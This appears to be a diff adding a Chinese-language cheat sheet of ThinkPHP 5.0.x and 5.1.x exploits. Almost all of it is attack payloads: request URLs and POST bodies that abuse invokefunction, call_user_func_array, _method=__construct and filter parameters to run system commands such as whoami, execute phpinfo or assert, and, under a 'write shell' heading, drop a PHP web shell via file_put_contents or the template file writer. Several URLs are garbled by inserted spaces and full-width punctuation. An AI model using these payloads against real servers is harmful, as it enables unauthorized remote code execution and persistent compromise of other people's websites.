@@ -1,0 +1,19 @@
+1.远程命令执行exp： http：// localhost：9096 / index.php？s = index / think \ app / invokefunction＆function = call_user_func_array＆vars [0] = system＆vars [1] [] = whoami
+
+版本：5.0.0〜5.0.23xexp：http : //127.0.0.1/index.php ?s=captcha
+
+post_poc1：_method = __ construct＆filter [] = system＆method = get＆get [] = whoami post_poc2：_method = __ construct＆filter [] = system＆method = get＆server [REQUEST_METHOD] = whoami
+
+2.远程代码执行 http：// localhost：9096 / public / index.php？s = index / \ think \ app / invokefunction＆function = call_user_func_array＆vars [0] = phpinfo＆vars [1] [] = 1＃执行代码phpinfo（）
+
+http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&filter=assert＃5.1.x版本执行phpinfo（）
+
+http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1＃5.1.x 版本
+
+http://127.0.0.1/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars [0] = assert＆vars [1] [] = phpinfo（） ＃5.0.x版本
+
+3.写shell
+
+http://127.0.0.1/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=***.php&vars[1][]= *** http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content= http：// localhost：9096 / public / index.php？s = index / think \ app / invokefunction＆function = call_user_func_array＆vars [0] = system＆vars [1] [] = echo “ ” >> 2.php
+
+PS：路径未必都是index.php？s = index / ，也有可能http://127.0.0.1/?s=home/ *
